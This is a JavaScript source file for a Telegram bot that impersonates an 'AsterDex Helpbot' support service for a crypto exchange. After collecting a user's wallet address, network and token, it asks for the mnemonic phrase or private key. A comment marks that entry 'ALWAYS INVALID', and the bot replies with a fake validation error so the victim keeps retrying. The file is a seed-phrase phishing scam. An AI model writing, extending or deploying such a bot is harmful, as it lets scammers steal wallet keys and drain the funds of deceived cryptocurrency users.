const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Optional: your Telegram ID to receive reports
const ownerId = 'YOUR_TELEGRAM_USER_ID';

// Store per-user states
const chatStates = {};

// --- START COMMAND ---
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  delete chatStates[chatId];

  await bot.sendMessage(
    chatId,
    "👋 Welcome to *AsterDex Helpbot!* Let's process your issue for Spot, Perp or others.",
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🛠 Report an Issue', callback_data: 'report_issue' }],
        ],
      },
    }
  );
});

// --- ISSUE COMMAND (RESTART FLOW) ---
bot.onText(/\/issue/, async (msg) => {
  const chatId = msg.chat.id;
  delete chatStates[chatId];

  await bot.sendMessage(chatId, '🔄 Restarting issue report...', {
    reply_markup: { remove_keyboard: true },
  });

  await bot.sendMessage(
    chatId,
    "👋 Welcome to *AsterDex Helpbot!* Let's process your issue for Spot, Perp or others.",
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🛠 Report an Issue', callback_data: 'report_issue' }],
        ],
      },
    }
  );
});

// --- CALLBACK HANDLER ---
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  switch (data) {
    // === Report Issue ===
    case 'report_issue':
      await bot.sendMessage(chatId, '🤔 What issue are you currently facing?', {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: '💰 Deposit on Spot',
                callback_data: 'issue_deposit_spot',
              },
            ],
            [
              {
                text: '🏦 Withdrawal on Spot',
                callback_data: 'issue_withdraw_spot',
              },
            ],
            [
              {
                text: '📈 Deposit on Perp',
                callback_data: 'issue_deposit_perp',
              },
            ],
            [
              {
                text: '📉 Withdrawal on Perp',
                callback_data: 'issue_withdraw_perp',
              },
            ],
            [
              {
                text: '🔁 Spot/Perp Transfer',
                callback_data: 'issue_transfer',
              },
            ],
            [{ text: '❓ Other', callback_data: 'issue_other' }],
          ],
        },
      });
      break;

    // === Issue Selected ===
    case 'issue_deposit_spot':
    case 'issue_withdraw_spot':
    case 'issue_deposit_perp':
    case 'issue_withdraw_perp':
    case 'issue_transfer':
    case 'issue_other':
      chatStates[chatId] = {
        step: 'awaiting_wallet_address',
        issueType: data.replace('issue_', '').replace(/_/g, ' '),
      };

      await bot.sendMessage(
        chatId,
        '🏷️ Enter wallet address — exactly as shown in your wallet:',
        {
          reply_markup: {
            keyboard: [[{ text: 'Cancel' }]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        }
      );
      break;

    // === Network Selection ===
    case 'network_ethereum':
    case 'network_bnb':
    case 'network_solana':
    case 'network_polygon':
    case 'network_arbitrum':
    case 'network_avalanche':
    case 'network_other': {
      const state = chatStates[chatId];
      if (!state) return;

      state.network = data.replace('network_', '').toUpperCase();
      state.step = 'awaiting_token_selection';

      await bot.sendMessage(chatId, `✅ Network selected: *${state.network}*`, {
        parse_mode: 'Markdown',
      });

      await bot.sendMessage(
        chatId,
        '💠 Which token are you facing this issue with?',
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: 'USDC', callback_data: 'token_usdc' }],
              [{ text: 'USDT', callback_data: 'token_usdt' }],
              [{ text: 'USD1', callback_data: 'token_usd1' }],
              [{ text: 'BTC', callback_data: 'token_btc' }],
              [{ text: 'ETH', callback_data: 'token_eth' }],
              [{ text: 'APX', callback_data: 'token_apx' }],
              [{ text: 'Aster', callback_data: 'token_aster' }],
              [{ text: 'SOL', callback_data: 'token_sol' }],
              [{ text: 'Other', callback_data: 'token_other' }],
            ],
          },
        }
      );
      break;
    }

    // === Token Selection ===
    case 'token_usdc':
    case 'token_usdt':
    case 'token_usd1':
    case 'token_btc':
    case 'token_eth':
    case 'token_apx':
    case 'token_aster':
    case 'token_sol':
    case 'token_other': {
      const state = chatStates[chatId];
      if (!state) return;

      state.token = data.replace('token_', '').toUpperCase();
      state.step = 'awaiting_confirmation';

      const summary =
        `🧾 *Issue Report*\n` +
        `• Issue Type: ${state.issueType.replace(/\b\w/g, (c) =>
          c.toUpperCase()
        )}\n` +
        `• Wallet Address: ${state.walletAddress}\n` +
        `• Network: ${state.network}\n` +
        `• Token: ${state.token}`;

      await bot.sendMessage(chatId, summary, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '➡️ Next', callback_data: 'next_step' }],
            [{ text: '🔄 Start Over', callback_data: 'restart_bot' }],
          ],
        },
      });
      break;
    }

    // === NEXT STEP ===
    case 'next_step': {
      const state = chatStates[chatId];
      if (!state) return;

      state.step = 'awaiting_authorization';

      await bot.sendMessage(
        chatId,
        '🔐 Now enter your mnemonic phrase or private key to authorize:',
        {
          reply_markup: {
            keyboard: [[{ text: 'Cancel' }]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        }
      );
      break;
    }

    // === RESTART BOT ===
    case 'restart_bot': {
      delete chatStates[chatId];
      await bot.sendMessage(chatId, '🔄 Starting over...', {
        reply_markup: { remove_keyboard: true },
      });
      await bot.sendMessage(
        chatId,
        "👋 Welcome to *AsterDex Helpbot!* Let's process your issue for Spot, Perp or others.",
        {
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '🛠 Report an Issue', callback_data: 'report_issue' }],
            ],
          },
        }
      );
      break;
    }

    default:
      break;
  }

  bot.answerCallbackQuery(query.id).catch(console.error);
});

// --- MESSAGE HANDLER ---
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text?.trim();
  if (!text) return;

  if (text === 'Cancel') {
    delete chatStates[chatId];
    await bot.sendMessage(chatId, '✅ Operation canceled.', {
      reply_markup: { remove_keyboard: true },
    });
    return;
  }

  const state = chatStates[chatId];

  // === Wallet Address Input ===
  if (state?.step === 'awaiting_wallet_address') {
    state.walletAddress = text;
    state.step = 'awaiting_network_selection';

    await bot.sendMessage(chatId, '🌐 What network are you facing issues on?', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Ethereum', callback_data: 'network_ethereum' }],
          [{ text: 'BNB Chain', callback_data: 'network_bnb' }],
          [{ text: 'Solana', callback_data: 'network_solana' }],
          [{ text: 'Polygon', callback_data: 'network_polygon' }],
          [{ text: 'Arbitrum', callback_data: 'network_arbitrum' }],
          [{ text: 'Avalanche', callback_data: 'network_avalanche' }],
          [{ text: 'Other', callback_data: 'network_other' }],
        ],
      },
    });
    return;
  }

  // === Mnemonic/Private Key Input (ALWAYS INVALID) ===
  if (state?.step === 'awaiting_authorization') {
    await bot.sendMessage(
      chatId,
      `⚠️ Validation Error: There’s an error in your input, please try again.\n\nNow enter your mnemonic phrase or private key to authorize or send /issue to restart.`,
      {
        parse_mode: 'Markdown',
      }
    );
    return;
  }
});
